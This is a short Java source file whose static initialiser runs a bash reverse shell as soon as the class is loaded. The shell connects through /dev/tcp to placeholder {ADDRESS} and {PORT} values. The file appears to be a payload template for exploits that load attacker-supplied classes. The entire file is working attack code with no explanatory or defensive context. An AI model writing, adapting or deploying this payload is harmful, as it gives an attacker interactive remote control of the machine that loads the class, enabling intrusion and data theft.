public class Run {
  static {
    try {
      String[] arrayOfString = {"/bin/bash","-c","/bin/bash -i >& /dev/tcp/{ADDRESS}/{PORT} 0>&1"};
      Runtime runtime = Runtime.getRuntime();
      Process process = runtime.exec(arrayOfString);
      process.waitFor();
    }
    catch (Exception exception) {
      System.out.println(exception.toString());
    }
  }
}